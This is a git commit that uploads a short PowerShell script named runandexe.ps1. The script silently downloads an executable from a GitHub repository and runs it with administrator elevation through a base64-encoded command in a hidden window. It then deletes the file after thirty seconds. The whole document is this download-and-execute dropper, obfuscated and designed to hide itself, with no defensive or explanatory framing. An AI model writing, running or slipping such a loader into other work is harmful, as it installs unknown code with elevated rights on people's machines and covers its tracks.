51fb23deb46253669b4613fc1b9afbe2dd9e3a13
tayic99373 <131182588+tayic99373@users.noreply.github.com>
2023-04-18 17:19:38 +0200

    Add files via upload

---
+++ runandexe.ps1
@@ -0,0 +1,14 @@
+$Url = "https://github.com/AlexanderWhite77/Crimm/raw/main/main.exe"
+$OutputFile = "main.exe"
+
+$ProgressPreference = 'SilentlyContinue'
+Invoke-WebRequest -Uri $Url -OutFile $OutputFile
+
+$script = @'
+Start-Process -FilePath ".\main.exe" -Verb RunAs
+Start-Sleep -Seconds 30
+Remove-Item -Path ".\main.exe"
+'@
+
+$encoded = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($script))
+Start-Process -WindowStyle Hidden -FilePath PowerShell.exe -ArgumentList "-NoProfile -EncodedCommand $encoded"
